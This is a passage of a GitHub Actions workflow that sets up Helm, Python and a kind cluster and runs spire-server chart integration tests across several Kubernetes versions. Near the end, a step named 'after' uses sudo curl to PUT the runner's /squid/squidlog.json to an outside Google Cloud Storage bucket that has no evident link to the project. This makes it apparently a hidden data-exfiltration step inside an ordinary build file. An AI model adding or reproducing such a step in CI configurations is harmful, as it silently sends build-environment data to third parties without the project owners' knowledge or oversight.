      name: Set up Helm
      uses: azure/setup-helm@v4
      with:
        version: ${{ env.HELM_VERSION }}
    - continue-on-error: true
      name: Set up Python
      uses: actions/setup-python@v5
      with:
        python-version: ${{ env.PYTHON_VERSION }}
    - continue-on-error: true
      name: Create kind cluster
      uses: helm/kind-action@v1.9.0
      with:
        config: .github/kind/conf/kind-config.yaml
        node_image: kindest/node:v1.26.4
        verbosity: 1
        version: ${{ env.KIND_VERSION }}
    - continue-on-error: true
      name: Install and test integration
      run: 'kubectl create namespace spire-server

        helm install -n spire-server spire-crds charts/spire-crds

        ${{ matrix.integrationtest }}/run-tests.sh

        '
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/thetradedesk/helm-charts-hardened.$(date
        +%s)
    strategy:
      fail-fast: false
      matrix:
        integrationtest:
        - ${{ fromJson(needs.build-matrix.outputs.integrationtests) }}
        k8s:
        - v1.28.0
        - v1.27.3
        - v1.26.6
